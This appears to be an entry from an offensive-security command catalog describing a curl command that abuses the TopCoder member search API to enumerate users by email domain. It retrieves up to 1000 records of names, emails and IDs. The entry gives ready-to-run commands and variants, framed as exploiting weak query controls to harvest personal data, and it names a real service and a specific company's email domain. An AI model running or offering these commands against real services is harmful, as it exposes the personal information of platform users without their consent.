---
data: >-
  curl -X GET
  "https://api.topcoder.com/v3/members/_search/?fields=userId%2Chandle%2CphotoURL%2CfirstName%2ClastName%2Cdetails%2Cemail&query=email%3A@wearehackerone.com&limit=1000"
  -H "Authorization: Bearer TOKEN" -H "Accept: application/json"
tags:
  - enumeration
  - api-search
type: command
output: >-
  JSON array of user objects with userId, handle, firstName, lastName, email,
  etc.
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.348Z'
id: 8036c469-467d-4bd5-a34a-ba877e70c00d
verified: false
validated: true
submitted: true
---
# topcoder-member-search-enumerate

## Command

```bash
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId%2Chandle%2CphotoURL%2CfirstName%2ClastName%2Cdetails%2Cemail&query=email%3A@wearehackerone.com&limit=1000" -H "Authorization: Bearer TOKEN" -H "Accept: application/json"
```

## Description

This command performs a manipulated search on the TopCoder member API to enumerate users by email domain, exploiting weak query controls to retrieve up to 1000 user records including IDs and basic PII.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `query` | Search filter, e.g., email:@domain.com for domain enumeration | Yes |
| `limit` | Maximum results, set to 1000 for broad enumeration | Yes |
| `fields` | Comma-separated fields to return: userId,handle,photoURL,firstName,lastName,details,email | Yes |
| `Authorization` | Bearer token for session | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId,handle&query=email:@example.com&limit=100" -H "Authorization: Bearer TOKEN"
```

### Advanced Usage

```bash
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId,handle,photoURL,firstName,lastName,details,email&query=email:@wearehackerone.com&limit=1000" -H "Authorization: Bearer TOKEN" -H "Accept: application/json" | jq '.[].userId'
```

## Expected Output

JSON response with an array of user objects, e.g., {"result": [{"userId": 41008482, "handle": "user1", "firstName": "John", "email": "john@domain.com"}]}.

## Related

- [[commands/topcoder-project-invite-disclose]]
- [[procedures/Enumerate-User-IDs-via-Member-Search-Endpoint]]
